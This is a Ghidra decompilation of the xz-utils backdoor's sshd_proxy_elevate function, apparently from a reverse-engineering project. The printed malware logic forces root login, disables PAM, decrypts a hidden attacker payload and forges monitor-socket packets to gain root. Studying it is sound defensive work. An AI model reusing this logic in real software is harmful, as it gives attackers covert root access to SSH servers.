// /home/kali/xzre-ghidra/xzregh/108270_sshd_proxy_elevate.c
// Function: sshd_proxy_elevate @ 0x108270
// Calling convention: __stdcall
// Prototype: BOOL __stdcall sshd_proxy_elevate(monitor_data_t * args, global_context_t * ctx)


/*
 * AutoDoc: Crafts and transmits a forged MONITOR_REQ_KEYALLOWED packet through the monitor socket to obtain root privileges in sandboxed sshd instances. It’s invoked by run_backdoor_commands when the current context lacks the ability to execute the payload directly.
 */
#include "xzre_types.h"


BOOL sshd_proxy_elevate(monitor_data_t *args,global_context_t *ctx)

{
  u8 uVar1;
  char cVar2;
  u32 uVar3;
  imported_funcs_t *piVar4;
  libc_imports_t *plVar5;
  sshd_ctx_t *psVar6;
  long *plVar7;
  undefined8 *puVar8;
  _func_56 *p_Var9;
  int fd;
  BOOL BVar10;
  uint uVar11;
  int iVar12;
  cmd_arguments_t *pcVar13;
  long *plVar14;
  ssize_t sVar15;
  int *piVar16;
  RSA *r;
  BIGNUM *pBVar17;
  BIGNUM *pBVar18;
  BIGNUM *d;
  EVP_MD *type;
  long lVar19;
  byte extraout_DL;
  size_t sVar20;
  byte bVar21;
  uint socket_index;
  undefined8 *puVar22;
  u64 bufferSize;
  uint *puVar23;
  ulong *puVar24;
  sshbuf *psVar25;
  uint *puVar26;
  undefined4 *puVar27;
  undefined1 *puVar28;
  uint *puVar29;
  size_t *psVar30;
  u8 *puVar31;
  char *pcVar32;
  ulong uVar33;
  long *addr;
  long lVar34;
  byte bVar35;
  uchar local_e81;
  int local_e80;
  uint local_e7c;
  u64 local_e78;
  BIGNUM *local_e70 [2];
  uchar local_e60 [32];
  undefined8 local_e40;
  undefined8 uStack_e38;
  undefined4 local_e30 [57];
  undefined1 local_d4a;
  undefined1 local_d41;
  ulong local_d40 [2];
  undefined4 local_d30 [60];
  sshbuf local_c40 [4];
  uint local_b20 [2];
  undefined1 uStack_b18;
  undefined7 uStack_b17;
  undefined1 local_b10;
  uint uStack_b0f;
  undefined4 uStack_b0b;
  undefined7 uStack_b07;
  undefined1 uStack_b00;
  undefined4 uStack_aff;
  undefined4 uStack_afb;
  undefined4 uStack_af7;
  undefined8 uStack_af3;
  undefined4 local_aeb;
  undefined4 local_ac7;
  undefined1 local_ac3;
  undefined1 local_ac1;
  undefined4 local_ac0;
  undefined4 local_abb [66];
  undefined4 local_9b3;
  uint local_98b;
  undefined4 local_987;
  undefined3 local_983;
  undefined1 uStack_980;
  undefined3 uStack_97f;
  uint local_920 [5];
  undefined1 local_90b [399];
  u8 local_77c [1868];
  
  bVar35 = 0;
  local_920[0] = 0;
  local_920[1] = 0;
  local_920[2] = 0;
  local_920[3] = 0;
  puVar26 = local_920 + 4;
  for (lVar19 = 0x236; lVar19 != 0; lVar19 = lVar19 + -1) {
    *puVar26 = 0;
    puVar26 = puVar26 + 1;
  }
  local_e80 = -1;
  if (args == (monitor_data_t *)0x0) {
    return 0;
  }
  pBVar17 = args->rsa_n;
  if (pBVar17 == (BIGNUM *)0x0) {
    return 0;
  }
  pBVar18 = args->rsa_e;
  if (pBVar18 == (BIGNUM *)0x0) {
    return 0;
  }
  uVar3 = args->cmd_type;
  if ((uVar3 == 3) && ((args->args->flags2 & 0x40) == 0)) {
    if (args->rsa == (RSA *)0x0) {
      return 0;
    }
    if (args->payload_body == (u8 *)0x0) {
      return 0;
    }
    if (args->payload_body_size != 0x30) {
      return 0;
    }
  }
  if (ctx == (global_context_t *)0x0) {
    return 0;
  }
  piVar4 = ctx->imported_funcs;
  if (piVar4 == (imported_funcs_t *)0x0) {
    return 0;
  }
  plVar5 = ctx->libc_imports;
  if (plVar5 == (libc_imports_t *)0x0) {
    return 0;
  }
  if (plVar5->pselect == (_func_24 *)0x0) {
    return 0;
  }
  if (plVar5->__errno_location == (_func_26 *)0x0) {
    return 0;
  }
  psVar6 = ctx->sshd_ctx;
  if (psVar6->have_mm_answer_keyallowed == 0) {
    if (uVar3 == 0) {
      return 0;
    }
    pcVar13 = args->args;
    if (uVar3 != 3) {
      if (pcVar13 == (cmd_arguments_t *)0x0) {
        if (uVar3 != 1) goto LAB_0010845f;
      }
      else if (uVar3 != 1) {
        if (uVar3 == 2) goto LAB_0010845f;
        goto LAB_00108447;
      }
      goto LAB_0010843f;
    }
    if ((pcVar13->flags3 & 0x20) != 0) {
      return 0;
    }
LAB_0010844c:
    uVar1 = pcVar13->field_0x3;
LAB_00108450:
    if ((char)uVar1 < '\0') goto LAB_0010845f;
  }
  else {
    pcVar13 = args->args;
    if (pcVar13 == (cmd_arguments_t *)0x0) {
      if (uVar3 == 0) goto LAB_00108434;
      if (uVar3 != 1) {
LAB_00108447:
        if (uVar3 != 3) goto LAB_0010845f;
        goto LAB_0010844c;
      }
    }
    else if (uVar3 != 1) {
      if (uVar3 == 2) goto LAB_0010845f;
      if (uVar3 != 0) goto LAB_00108447;
LAB_00108434:
      uVar1 = pcVar13->flags2;
      goto LAB_00108450;
    }
LAB_0010843f:
    if ((pcVar13->flags2 & 1) != 0) goto LAB_0010845f;
  }
  *psVar6->permit_root_login_ptr = 3;
LAB_0010845f:
  if ((args->cmd_type < 2) || (args->cmd_type == 3)) {
    if ((pcVar13->flags1 & 0x40) != 0) {
      if (psVar6->use_pam_ptr == (int *)0x0) {
        return 0;
      }
      *psVar6->use_pam_ptr = 0;
    }
    if ((args->cmd_type == 3) && (bVar21 = pcVar13->flags2 & 0xc0, bVar21 != 0xc0)) {
      if (bVar21 == 0x40) {
        if (plVar5->exit == (_func_19 *)0x0) {
          return 0;
        }
        (*plVar5->exit)(0);
        return 0;
      }
      if (args->payload_body_size < 0x30) {
        return 0;
      }
      plVar7 = (long *)args->payload_body;
      lVar19 = *plVar7;
      sVar20 = plVar7[1];
      if (0x3fef < sVar20 - 0x11) {
        return 0;
      }
      puVar8 = (undefined8 *)plVar5->__libc_stack_end;
      puVar22 = (undefined8 *)register0x00000020;
      do {
        if (puVar8 <= puVar22) {
          return 0;
        }
        addr = (long *)*puVar22;
        if ((long *)0xffffff < addr) {
          BVar10 = is_range_mapped((u8 *)addr,0x4001 - sVar20,ctx);
          if (BVar10 != 0) {
            plVar14 = (long *)((0x4001 - sVar20) + (long)addr);
            for (; addr < plVar14; addr = (long *)((long)addr + 1)) {
              local_b20[0] = 0;
              local_b20[1] = 0;
              uStack_b18 = 0;
              uStack_b17 = 0;
              local_b10 = 0;
              uStack_b0f = 0;
              uStack_b0b = 0;
              uStack_b07 = 0;
              if ((*addr == lVar19) &&
                 (BVar10 = sha256(addr,sVar20,(u8 *)local_b20,0x20,ctx->imported_funcs), BVar10 != 0
                 )) {
                lVar34 = 0;
                while( true ) {
                  cVar2 = *(char *)((long)plVar7 + lVar34 + 0x10);
                  uVar1 = *(u8 *)((long)local_b20 + lVar34);
                  if ((cVar2 < (char)uVar1) || ((char)uVar1 < cVar2)) break;
                  lVar34 = lVar34 + 1;
                  if (lVar34 == 0x20) {
                    local_b20[0] = 0;
                    local_b20[1] = 0;
                    uStack_b18 = 0;
                    uStack_b17 = 0;
                    puVar28 = &local_b10;
                    for (lVar19 = 0x29; lVar19 != 0; lVar19 = lVar19 + -1) {
                      *puVar28 = 0;
                      puVar28 = puVar28 + (ulong)bVar35 * -2 + 1;
                    }
                    BVar10 = secret_data_get_decrypted((u8 *)local_b20,ctx);
                    if (BVar10 == 0) {
                      return 0;
                    }
                    sVar20 = sVar20 - 0x10;
                    puVar26 = (uint *)(addr + 2);
                    BVar10 = chacha_decrypt((u8 *)puVar26,(int)sVar20,(u8 *)local_b20,(u8 *)addr,
                                            (u8 *)puVar26,ctx->imported_funcs);
                    if (BVar10 == 0) {
                      return 0;
                    }
                    goto LAB_00108861;
                  }
                }
              }
            }
          }
        }
        puVar22 = puVar22 + 1;
      } while( true );
    }
  }
  pcVar32 = ctx->STR_ssh_rsa_cert_v01_openssh_com;
  local_d40[0] = 0;
  local_d40[1] = 0;
  puVar26 = local_b20;
  for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
    *puVar26 = 0;
    puVar26 = puVar26 + 1;
  }
  local_e81 = '\x01';
  psVar25 = local_c40;
  for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
    *(undefined4 *)&psVar25->d = 0;
    psVar25 = (sshbuf *)((long)&psVar25->d + 4);
  }
  local_e7c = 0;
  puVar27 = local_e30;
  for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
    *puVar27 = 0;
    puVar27 = puVar27 + 1;
  }
  local_e60[0] = '\0';
  local_e60[1] = '\0';
  local_e60[2] = '\0';
  local_e60[3] = '\0';
  local_e60[4] = '\0';
  local_e60[5] = '\0';
  local_e60[6] = '\0';
  local_e60[7] = '\0';
  local_e60[8] = '\0';
  local_e60[9] = '\0';
  local_e60[10] = '\0';
  local_e60[0xb] = '\0';
  local_e60[0xc] = '\0';
  local_e60[0xd] = '\0';
  local_e60[0xe] = '\0';
  local_e60[0xf] = '\0';
  puVar27 = local_d30;
  for (lVar19 = 0x3c; lVar19 != 0; lVar19 = lVar19 + -1) {
    *puVar27 = 0;
    puVar27 = puVar27 + 1;
  }
  local_e60[0x10] = '\0';
  local_e60[0x11] = '\0';
  local_e60[0x12] = '\0';
  local_e60[0x13] = '\0';
  local_e60[0x14] = '\0';
  local_e60[0x15] = '\0';
  local_e60[0x16] = '\0';
  local_e60[0x17] = '\0';
  local_e60[0x18] = '\0';
  local_e60[0x19] = '\0';
  local_e60[0x1a] = '\0';
  local_e60[0x1b] = '\0';
  local_e60[0x1c] = '\0';
  local_e60[0x1d] = '\0';
  local_e60[0x1e] = '\0';
  local_e60[0x1f] = '\0';
  local_e40 = 0;
  uStack_e38 = 0;
  if (((pcVar32 != (char *)0x0) && (ctx->STR_rsa_sha2_256 != (char *)0x0)) &&
     (BVar10 = contains_null_pointers(&piVar4->RSA_new,9), BVar10 == 0)) {
    puVar26 = local_920;
    lVar34 = 0;
    uVar33 = 0;
    local_b20[1] = (uint)extraout_DL;
    uStack_b18 = 2;
    puVar23 = puVar26;
    for (lVar19 = 0x23a; lVar19 != 0; lVar19 = lVar19 + -1) {
      *puVar23 = 0;
      puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
    }
    uStack_b0b = 0x1c000000;
    local_e70[0] = pBVar18;
    local_e40 = CONCAT71(local_e40._1_7_,0x80);
    local_e70[1] = pBVar17;
    uStack_b07 = (undefined7)*(undefined8 *)pcVar32;
    uStack_b00 = (undefined1)((ulong)*(undefined8 *)pcVar32 >> 0x38);
    uStack_aff = (undefined4)*(undefined8 *)(pcVar32 + 8);
    local_aeb = 0x20000000;
    local_d4a = 8;
    local_d41 = 1;
    local_ac7 = 0x3000000;
    local_ac3 = 1;
    local_ac1 = 1;
    local_ac0 = 0x1010000;
    uStack_afb = (undefined4)*(undefined8 *)(pcVar32 + 0xc);
    uStack_af7 = (undefined4)((ulong)*(undefined8 *)(pcVar32 + 0xc) >> 0x20);
    uStack_af3 = *(undefined8 *)(pcVar32 + 0x14);
    puVar22 = &local_e40;
    puVar27 = local_abb;
    for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
      *puVar27 = *(undefined4 *)puVar22;
      puVar22 = (undefined8 *)((long)puVar22 + (ulong)bVar35 * -8 + 4);
      puVar27 = puVar27 + (ulong)bVar35 * -2 + 1;
    }
    bufferSize = 0x628;
    local_9b3 = 0x1000000;
    local_987 = 0x7000000;
    local_983 = (undefined3)*(undefined4 *)pcVar32;
    uStack_980 = (undefined1)*(undefined4 *)(pcVar32 + 3);
    uStack_97f = (undefined3)((uint)*(undefined4 *)(pcVar32 + 3) >> 8);
    while( true ) {
      local_e78 = 0;
      BVar10 = bignum_serialize(local_77c + uVar33,bufferSize,&local_e78,local_e70[lVar34],piVar4);
      if ((BVar10 == 0) || (bufferSize < local_e78)) break;
      uVar33 = uVar33 + local_e78;
      bufferSize = bufferSize - local_e78;
      if (lVar34 != 0) {
        if (0x628 < uVar33) {
          return 0;
        }
        iVar12 = (int)uVar33;
        uVar11 = iVar12 + 0xb;
        local_98b = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                    uVar11 * 0x1000000;
        uVar11 = iVar12 + 0x2a7;
        uStack_b0f = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                     uVar11 * 0x1000000;
        uVar11 = iVar12 + 700;
        local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                       uVar11 * 0x1000000;
        piVar4 = ctx->imported_funcs;
        puVar23 = local_b20;
        puVar29 = puVar26;
        for (lVar19 = 0x69; lVar19 != 0; lVar19 = lVar19 + -1) {
          *puVar29 = *puVar23;
          puVar23 = puVar23 + (ulong)bVar35 * -2 + 1;
          puVar29 = puVar29 + (ulong)bVar35 * -2 + 1;
        }
        r = (*piVar4->RSA_new)();
        if (r == (RSA *)0x0) {
          return 0;
        }
        pBVar17 = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
        if (pBVar17 != (BIGNUM *)0x0) {
          pBVar18 = (*ctx->imported_funcs->BN_bin2bn)((uchar *)&local_e40,0x100,(BIGNUM *)0x0);
          d = (*ctx->imported_funcs->BN_bin2bn)(&local_e81,1,(BIGNUM *)0x0);
          iVar12 = (*ctx->imported_funcs->RSA_set0_key)(r,pBVar18,pBVar17,d);
          if (iVar12 != 1) goto LAB_00108cd2;
          p_Var9 = ctx->imported_funcs->EVP_Digest;
          type = (*ctx->imported_funcs->EVP_sha256)();
          iVar12 = (*p_Var9)(local_90b,uVar33 + 399,local_e60,(uint *)0x0,type,(ENGINE *)0x0);
          if (iVar12 == 1) {
            iVar12 = (*ctx->imported_funcs->RSA_sign)
                               (0x2a0,local_e60,0x20,(uchar *)local_d40,&local_e7c,r);
            if ((iVar12 == 1) && (local_e7c == 0x100)) {
              local_c40[0].d = (u8 *)0xc00000014010000;
              local_c40[0].off._4_4_ = 0x10000;
              local_c40[0].cd = *(u8 **)ctx->STR_rsa_sha2_256;
              local_c40[0].off._0_4_ = *(undefined4 *)(ctx->STR_rsa_sha2_256 + 8);
              sVar20 = uVar33 + 0x2c0;
              puVar24 = local_d40;
              psVar30 = &local_c40[0].size;
              for (lVar19 = 0x40; lVar19 != 0; lVar19 = lVar19 + -1) {
                *(int *)psVar30 = (int)*puVar24;
                puVar24 = (ulong *)((long)puVar24 + (ulong)bVar35 * -8 + 4);
                psVar30 = (size_t *)((long)psVar30 + (ulong)bVar35 * -8 + 4);
              }
              piVar4 = ctx->imported_funcs;
              psVar25 = local_c40;
              puVar31 = local_77c + uVar33;
              for (lVar19 = 0x47; lVar19 != 0; lVar19 = lVar19 + -1) {
                *(undefined4 *)puVar31 = *(undefined4 *)&psVar25->d;
                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
                puVar31 = puVar31 + ((ulong)bVar35 * -2 + 1) * 4;
              }
              (*piVar4->RSA_free)(r);
LAB_00108861:
              pcVar13 = args->args;
              uVar11 = args->cmd_type;
              if (pcVar13 == (cmd_arguments_t *)0x0) {
                return 0;
              }
              if ((pcVar13->flags1 & 0x20) == 0) {
                iVar12 = sshd_get_client_socket(ctx,&local_e80,1,DIR_WRITE);
              }
              else {
                if (uVar11 == 2) {
                  bVar21 = pcVar13->flags2 >> 1;
LAB_001088b7:
                  socket_index = (uint)bVar21;
                }
                else if (uVar11 < 3) {
                  if (uVar11 != 0) {
                    bVar21 = pcVar13->flags2 >> 2;
                    goto LAB_001088b7;
                  }
                  socket_index = pcVar13->flags2 >> 3 & 0xf;
                }
                else {
                  socket_index = 1;
                  if (uVar11 == 3) {
                    socket_index = pcVar13->flags3 & 0x1f;
                  }
                }
                iVar12 = sshd_get_usable_socket(&local_e80,socket_index,ctx->libc_imports);
              }
              fd = local_e80;
              if (iVar12 == 0) {
                return 0;
              }
              pcVar13 = args->args;
              uVar3 = args->cmd_type;
              plVar5 = ctx->libc_imports;
              psVar25 = local_c40;
              for (lVar19 = 0x12; lVar19 != 0; lVar19 = lVar19 + -1) {
                *(undefined4 *)&psVar25->d = 0;
                psVar25 = (sshbuf *)((long)psVar25 + (ulong)bVar35 * -8 + 4);
              }
              if (local_e80 < 0) {
                return 0;
              }
              if (pcVar13 == (cmd_arguments_t *)0x0) {
                return 0;
              }
              if (plVar5 == (libc_imports_t *)0x0) {
                return 0;
              }
              if (plVar5->exit == (_func_19 *)0x0) {
                return 0;
              }
              if ((uVar3 == 0) || ((uVar3 == 3 && ((pcVar13->flags3 & 0x20) != 0)))) {
                BVar10 = sshd_get_sshbuf(local_c40,ctx);
                if (BVar10 == 0) {
                  return 0;
                }
                ctx->exit_flag = pcVar13->flags1 & 1;
              }
              sVar15 = fd_write(fd,puVar26,sVar20,plVar5);
              if (sVar15 < 0) {
                return 0;
              }
              if (uVar3 == 0) {
LAB_001089b5:
                local_b20[1] = local_b20[1] & 0xffffff00;
                sVar20 = local_c40[0].size;
                if (0x40 < local_c40[0].size) {
                  sVar20 = 0x40;
                }
                uVar11 = (int)sVar20 + 1;
                local_b20[0] = uVar11 >> 0x18 | (uVar11 & 0xff0000) >> 8 | (uVar11 & 0xff00) << 8 |
                               uVar11 * 0x1000000;
                sVar15 = fd_write(fd,local_b20,5,plVar5);
                if (sVar15 < 0) {
                  return 0;
                }
                sVar15 = fd_write(fd,local_c40[0].d,sVar20,plVar5);
                if (sVar15 < 0) {
                  return 0;
                }
                if (uVar3 != 3) goto LAB_0010897e;
              }
              else {
                if (uVar3 != 3) goto LAB_0010897e;
                if ((pcVar13->flags3 & 0x20) != 0) goto LAB_001089b5;
              }
              if (-1 < (char)pcVar13->flags1) {
                return 1;
              }
LAB_0010897e:
              local_d40[0] = local_d40[0] & 0xffffffff00000000;
              sVar15 = fd_read(fd,local_d40,4,plVar5);
              if (sVar15 < 0) {
                return 0;
              }
              uVar11 = (uint)local_d40[0] >> 0x18 | ((uint)local_d40[0] & 0xff0000) >> 8 |
                       ((uint)local_d40[0] & 0xff00) << 8 | (uint)local_d40[0] << 0x18;
              local_d40[0] = CONCAT44(local_d40[0]._4_4_,uVar11);
              uVar33 = (ulong)uVar11;
              if (uVar33 != 0) {
                if (plVar5->read == (_func_25 *)0x0) {
                  return 0;
                }
                if (plVar5->__errno_location == (_func_26 *)0x0) {
                  return 0;
                }
                do {
                  while( true ) {
                    sVar20 = 0x200;
                    if (uVar33 < 0x201) {
                      sVar20 = uVar33;
                    }
                    sVar15 = (*plVar5->read)(fd,local_b20,sVar20);
                    if (-1 < sVar15) break;
                    piVar16 = (*plVar5->__errno_location)();
                    if (*piVar16 != 4) {
                      return 0;
                    }
                  }
                  if (sVar15 == 0) {
                    return 0;
                  }
                  uVar33 = uVar33 - sVar15;
                } while (uVar33 != 0);
              }
              if (uVar3 != 2) {
                return 1;
              }
              if (plVar5->exit == (_func_19 *)0x0) {
                return 0;
              }
              (*plVar5->exit)(0);
              return 1;
            }
          }
        }
        pBVar18 = (BIGNUM *)0x0;
        pBVar17 = (BIGNUM *)0x0;
        d = (BIGNUM *)0x0;
LAB_00108cd2:
        (*ctx->imported_funcs->RSA_free)(r);
        if (pBVar17 != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(pBVar17);
        }
        if (pBVar18 != (BIGNUM *)0x0) {
          (*ctx->imported_funcs->BN_free)(pBVar18);
        }
        if (d == (BIGNUM *)0x0) {
          return 0;
        }
        (*ctx->imported_funcs->BN_free)(d);
        return 0;
      }
      lVar34 = 1;
    }
  }
  return 0;
}

